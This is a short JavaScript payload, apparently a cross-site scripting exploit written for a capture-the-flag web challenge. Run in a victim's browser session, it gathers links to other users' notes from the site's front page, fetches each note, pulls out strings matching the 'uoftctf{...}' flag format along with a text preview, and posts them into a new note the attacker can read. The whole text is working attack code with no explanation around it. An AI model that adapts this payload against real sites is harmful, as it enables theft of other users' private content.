fetch('/').then(function(r){ return r.text(); }).then(function(h){
  var notes = h.match(/\/note\/[a-f0-9]+/g) || [];
  var unique = [];
  notes.forEach(function(n){ if(unique.indexOf(n)===-1) unique.push(n); });
  var current = location.pathname;
  var others = unique.filter(function(n){ return n !== current; });
  
  Promise.all(others.map(function(n){ 
    return fetch(n).then(function(r){ return r.text(); }).catch(function(){ return ''; });
  })).then(function(pages){
    var allText = pages.join('\n');
    var flags = allText.match(/uoftctf\{[^}]+\}/g) || [];
    var preview = allText.substring(0, 3000);
    
    fetch('/note/new', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'title=FINAL&body=' + encodeURIComponent('FLAGS:' + (flags.join(',') || 'NONE') + '\n\n' + preview)
    });
  });
});
